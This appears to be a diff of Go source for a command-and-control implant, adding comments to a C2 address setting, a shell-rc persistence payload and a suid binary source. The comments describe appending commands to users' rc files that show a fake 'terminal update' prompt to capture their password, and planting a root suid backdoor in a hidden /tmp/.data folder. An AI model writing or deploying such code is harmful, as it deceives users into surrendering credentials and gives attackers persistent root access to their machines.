@@ -201,9 +201,13 @@ type Cmd struct {
 	Output  string
 }
 
+// Update with callback timeout and c2 address
 var timeoutSetting = 1
 var c2 = "http://127.0.0.1:8005"
 
+// Appends the following set of commands to the users rc files
+// When a new terminal opens the user will be asked to enter their password to complete terminal updates
+//asroot creates a suid binary in the /tmp/.data folder that accepts commands
 var privesc1 = `echo "Terminal Requires an update to contine."
 sleep 1
 echo "processing..."
@@ -215,6 +219,7 @@ echo "success" >> /tmp/.data/status
 echo "Update Complete"
 `
 
+//suid binary for accessing as root. Ties into privesc1.  /tmp/.data/temp whoami
 var asrootc = `
 #include <unistd.h>
 #include <sys/types.h>
